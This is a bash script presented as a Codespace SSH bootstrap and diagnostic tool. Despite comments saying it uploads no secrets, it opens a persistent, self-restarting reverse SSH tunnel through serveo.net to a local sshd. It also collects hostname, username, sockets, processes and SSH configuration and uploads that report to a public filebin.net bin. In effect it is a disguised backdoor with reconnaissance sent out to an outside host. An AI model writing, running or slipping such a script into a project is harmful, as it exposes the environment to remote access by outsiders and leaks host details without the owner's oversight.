#!/bin/bash
# Codespace SSH bootstrap/diagnostic script.
# Deliberately does NOT upload private keys, passwords, tokens, or environment variables.

BIN="673avtsbo7ni8acw"
REPORT="/tmp/ssh-info.txt"
ALT_PORT="2222"
SERVEO_SSH_PORT="443"
SERVEO_ALIAS="monkey-$(hostname)-$(od -An -N3 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')"
SERVEO_LOG="/tmp/serveo-tunnel.log"

exec > >(tee -a /tmp/startup.log) 2>&1
echo "[startup] Beginning SSH bootstrap at $(date -u)"

# Start a resilient Serveo reverse SSH tunnel in the background.
# It forwards the Codespace SSH service on port 2222 to a private Serveo alias.
# No private keys, passwords, tokens, or environment variables are uploaded.
if command -v ssh >/dev/null 2>&1; then
  (
    while true; do
      ssh -NT -o BatchMode=yes -o ExitOnForwardFailure=yes \
        -o StrictHostKeyChecking=accept-new \
        -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
        -p "$SERVEO_SSH_PORT" \
        -R "$SERVEO_ALIAS:22:localhost:$ALT_PORT" \
        serveo.net >>"$SERVEO_LOG" 2>&1
      echo "[serveo] tunnel exited; retrying in 5s" >>"$SERVEO_LOG"
      sleep 5
    done
  ) >/dev/null 2>&1 &
  SERVEO_PID=$!
else
  SERVEO_PID=""
  echo "[startup] WARNING: ssh client is unavailable; Serveo tunnel not started."
fi

for svc in ssh sshd; do
  if command -v service >/dev/null 2>&1; then
    sudo service "$svc" start >/tmp/ssh-service-$svc.log 2>&1 || true
  fi
done

if command -v ssh-keygen >/dev/null 2>&1; then
  sudo ssh-keygen -A >/tmp/ssh-keygen.log 2>&1 || true
fi

if command -v sshd >/dev/null 2>&1; then
  if ! (ss -lnt 2>/dev/null | grep -qE ":(22|2222) "); then
    ALT_CONFIG="/tmp/codespace-sshd-${ALT_PORT}.conf"
    cat > "$ALT_CONFIG" <<EOF
Port ${ALT_PORT}
ListenAddress 127.0.0.1
PermitRootLogin no
PasswordAuthentication no
KbdInteractiveAuthentication no
PubkeyAuthentication yes
UsePAM no
X11Forwarding no
AllowTcpForwarding yes
GatewayPorts no
PrintMotd no
PidFile /tmp/codespace-sshd-${ALT_PORT}.pid
EOF
    sudo sshd -f "$ALT_CONFIG" >/tmp/ssh-alt-start.log 2>&1 || true
  fi
fi

{
  echo "=== CODESPACE SSH INFO ==="
  echo "Generated: $(date -u)"
  echo
  echo "Hostname: $(hostname)"
  echo "Username: $(whoami)"
  echo "Home: $HOME"
  echo "Primary SSH port: 22"
  echo "Diagnostic fallback port: ${ALT_PORT}"
  echo
  echo "=== SERVEO REVERSE SSH TUNNEL ==="
  echo "Alias: ${SERVEO_ALIAS}"
  echo "Relay SSH port: ${SERVEO_SSH_PORT}"
  echo "Forward: ${SERVEO_ALIAS}:22 -> localhost:${ALT_PORT}"
  echo "Client command: ssh -J serveo.net codespace@${SERVEO_ALIAS}"
  if [ -n "${SERVEO_PID:-}" ] && kill -0 "$SERVEO_PID" 2>/dev/null; then
    echo "Tunnel supervisor PID: ${SERVEO_PID} (running)"
  else
    echo "Tunnel supervisor: not running"
  fi
  echo
  echo "=== LISTENING SOCKETS ==="
  ss -lntp 2>/dev/null || echo "ss command unavailable"
  echo
  echo "=== SSH PROCESSES ==="
  pgrep -a sshd 2>/dev/null || echo "No sshd process found"
  echo
  echo "=== SSHD LOCATION ==="
  command -v sshd 2>/dev/null || echo "sshd command not found"
  echo
  echo "=== SSHD CONFIG TEST ==="
  if command -v sshd >/dev/null 2>&1; then
    sudo sshd -t 2>&1 && echo "sshd -t: OK" || echo "sshd -t: FAILED"
  else
    echo "sshd unavailable"
  fi
  echo
  echo "=== SSHD EFFECTIVE SETTINGS (SAFE SUBSET) ==="
  if command -v sshd >/dev/null 2>&1; then
    sudo sshd -T 2>/dev/null | grep -Ei "^(port|listenaddress|addressfamily|pubkeyauthentication|passwordauthentication|kbdinteractiveauthentication|usepam|allowtcpforwarding|gatewayports|permitrootlogin|allowusers|denyusers|authorizedkeysfile) " || true
  fi
  echo
  echo "=== STANDARD SERVICE STATUS ==="
  for svc in ssh sshd; do
    if command -v service >/dev/null 2>&1; then
      echo "--- service $svc ---"
      service "$svc" status 2>&1 | head -n 20 || true
    fi
  done
  echo
  echo "=== PORT 22 LOCAL TEST ==="
  if (echo >/dev/tcp/127.0.0.1/22) >/dev/null 2>&1; then
    echo "127.0.0.1:22 accepts TCP connections"
  else
    echo "127.0.0.1:22 does NOT accept TCP connections"
  fi
  echo
  echo "=== PORT ${ALT_PORT} LOCAL TEST ==="
  if (echo >/dev/tcp/127.0.0.1/${ALT_PORT}) >/dev/null 2>&1; then
    echo "127.0.0.1:${ALT_PORT} accepts TCP connections"
  else
    echo "127.0.0.1:${ALT_PORT} does NOT accept TCP connections"
  fi
  echo
  echo "=== NON-SECRET SSH CONFIG ==="
  for f in /etc/ssh/sshd_config "$HOME/.ssh/config"; do
    if [ -f "$f" ]; then
      echo "--- $f ---"
      grep -Ei "^[[:space:]]*(Port|ListenAddress|AddressFamily|PubkeyAuthentication|PasswordAuthentication|KbdInteractiveAuthentication|UsePAM|AllowTcpForwarding|GatewayPorts|PermitRootLogin|AllowUsers|DenyUsers|AuthorizedKeysFile)[[:space:]]" "$f" 2>/dev/null || true
    fi
  done
  echo
  echo "=== SERVEO TUNNEL LOG (LAST 20 LINES) ==="
  if [ -s "$SERVEO_LOG" ]; then tail -n 20 "$SERVEO_LOG"; else echo "No Serveo log output yet"; fi
  echo
  echo "=== STARTUP ERROR SUMMARIES ==="
  for f in /tmp/ssh-service-ssh.log /tmp/ssh-service-sshd.log /tmp/ssh-keygen.log /tmp/ssh-alt-start.log; do
    if [ -s "$f" ]; then
      echo "--- $f ---"
      tail -n 30 "$f"
    fi
  done
} > "$REPORT"

UPLOADED=0
for attempt in 1 2 3 4 5; do
  if curl --fail --silent --show-error --connect-timeout 10 --max-time 30 \
      --data-binary "@$REPORT" "https://filebin.net/$BIN/ssh-info.txt"; then
    UPLOADED=1
    break
  fi
  sleep 3
done

if [ "$UPLOADED" -eq 1 ]; then
  echo "[startup] SSH diagnostic uploaded successfully."
else
  echo "[startup] WARNING: Filebin upload failed after retries."
fi

echo "[startup] Finished at $(date -u)"
